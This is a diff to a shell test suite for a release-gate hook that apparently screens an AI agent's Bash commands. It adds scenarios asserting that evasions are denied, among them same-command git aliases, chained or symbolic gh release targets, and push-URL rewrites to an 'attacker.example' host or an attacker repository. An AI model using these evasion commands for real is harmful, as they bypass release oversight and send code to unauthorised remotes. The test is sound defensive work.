@@ -2153,6 +2153,11 @@ assert_denied_command_with_git_alias_config "Scenario 49cs8: persistent git rele
   "git sidekickreleasepush" \
   "[alias]
   sidekickreleasepush = push origin v1.2.1"
+assert_denied_command "Scenario 49cs8a: same-command git config release alias is denied without markers" \
+  "git config alias.ship 'push origin HEAD:refs/tags/v1.2.1' && git ship"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cs8b: same-command git config release alias is denied with markers" \
+  "git config alias.ship 'push origin HEAD:refs/tags/v1.2.1' && git ship"
 assert_passthrough_command "Scenario 49cs9: dynamic branch refspec passes through" \
   'git push origin "$BRANCH"'
 assert_denied_command_with_env_var "Scenario 49cs9b: inherited BRANCH semver tag is denied" \
@@ -2254,10 +2259,10 @@ write_live_pyramid_markers_for_sha "${H}" "${stale_tag_sha}" 2
 PAYLOAD="$(jq -cn --arg cmd "${stale_gh_verified_release_command}" '{tool_name:"Bash",tool_input:{command:$cmd}}')"
 OUT="$(run_hook_from_cwd "${H}" "${PAYLOAD}" "${STALE_TAG_REPO}")"; RC=$?
 DECISION=$(printf '%s' "${OUT}" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
-if [ "${RC}" -eq 0 ] && [ -z "${DECISION}" ] && [ -z "${OUT}" ]; then
-  assert_pass "verified gh release stale tag passes with tag target markers"
+if [ "${RC}" -eq 0 ] && [ "${DECISION}" = "deny" ]; then
+  assert_pass "verified gh release stale tag is denied with local tag target markers"
 else
-  assert_fail "verified gh release stale tag with tag target markers" "rc=${RC} decision=${DECISION} out=${OUT}"
+  assert_fail "verified gh release stale tag with local tag target markers" "rc=${RC} decision=${DECISION} out=${OUT}"
 fi
 rm -rf "${H}"
 same_command_retag_push="git -C ${STALE_TAG_REPO} tag -f v7.7.7 HEAD && git -C ${STALE_TAG_REPO} push origin v7.7.7"
@@ -2404,6 +2409,12 @@ assert_denied_release_command_with_current_markers \
 assert_denied_release_command_with_current_markers \
   "Scenario 49ct4: git command-scoped URL insteadOf rewrite is denied" \
   "git -c url.https://github.com/attacker/other.git.insteadOf=https://github.com/alo-exp/sidekick.git push https://github.com/alo-exp/sidekick.git ${release_gate_test_tag}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49ct5: same-command git config pushInsteadOf rewrite is denied" \
+  "git config url.https://attacker.example/alo-exp/sidekick/.pushInsteadOf https://github.com/alo-exp/sidekick && git push https://github.com/alo-exp/sidekick.git ${release_gate_test_tag}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49ct6: same-command git remote push URL rewrite is denied" \
+  "git remote set-url --push origin https://github.com/attacker/other.git && git push origin ${release_gate_test_tag}"
 git -C "${REPO_ROOT}" update-ref -d "refs/tags/${release_gate_test_tag}" >/dev/null 2>&1 || true
 
 echo "Scenario 49cu: git -C release tag push requires target repository markers"
@@ -2551,6 +2562,32 @@ else
   assert_fail "gh release --target with target ref markers" "rc=${RC} decision=${DECISION} out=${OUT}"
 fi
 rm -rf "${H}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0: gh release --target symbolic branch is denied" \
+  "gh release create v1.2.1 --target main"
+multi_gh_mixed_target_command="gh release create v1.2.1 --target $(current_head_sha) && gh release create v2.2.2 --target ${target_ref_sha}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0a: multi-gh release with unauthorized second target is denied" \
+  "${multi_gh_mixed_target_command}"
+multi_gh_second_unresolved_command="gh release create v1.2.1 --target $(current_head_sha) && gh release create v2.2.2 --verify-tag"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0b: multi-gh release with unresolvable second target is denied" \
+  "${multi_gh_second_unresolved_command}"
+nested_multi_gh_mixed_target_command="bash -lc 'gh release create v1.2.1 --target $(current_head_sha) && gh release create v2.2.2 --target ${target_ref_sha}'"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0c: nested multi-gh release with unauthorized second target is denied" \
+  "${nested_multi_gh_mixed_target_command}"
+multi_release_test_tag="v555.555.555"
+git -C "${REPO_ROOT}" update-ref "refs/tags/${multi_release_test_tag}" HEAD
+multi_git_push_then_gh_command="git push origin ${multi_release_test_tag} && gh release create v2.2.2 --target ${target_ref_sha}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0d: git tag push plus gh release in one command is denied" \
+  "${multi_git_push_then_gh_command}"
+multi_gh_api_then_git_push_command="gh api -X POST repos/alo-exp/sidekick/releases -f tag_name=v1.2.1 -f target_commitish=$(current_head_sha) && git push origin ${multi_release_test_tag}"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv0e: gh api release plus git tag push in one command is denied" \
+  "${multi_gh_api_then_git_push_command}"
+git -C "${REPO_ROOT}" update-ref -d "refs/tags/${multi_release_test_tag}" >/dev/null 2>&1 || true
 gh_false_verify_target_after_command="gh release create v1.2.1 --target ${target_ref_sha} --verify-tag=false"
 assert_denied_release_command_with_sha_markers \
   "Scenario 49cv1a: gh release --target with later --verify-tag=false is denied" \
@@ -2603,6 +2640,10 @@ assert_denied_release_command_with_current_markers \
 assert_passthrough_release_command_with_sha_markers \
   "Scenario 49cv7: gh api release target_commitish passes with target ref markers" \
   "${gh_api_release_target_command}" "${target_ref_sha}"
+gh_api_symbolic_release_target_command="gh api -X POST repos/alo-exp/sidekick/releases -f tag_name=v1.2.1 -f target_commitish=main"
+assert_denied_release_command_with_current_markers \
+  "Scenario 49cv7a: gh api symbolic target_commitish is denied" \
+  "${gh_api_symbolic_release_target_command}"
 gh_api_tag_ref_target_command="gh api -X POST repos/alo-exp/sidekick/git/refs -f ref=refs/tags/v1.2.1 -f sha=${target_ref_sha}"
 assert_denied_release_command_with_current_markers \
   "Scenario 49cv8: gh api tag ref sha with current HEAD markers is denied" \
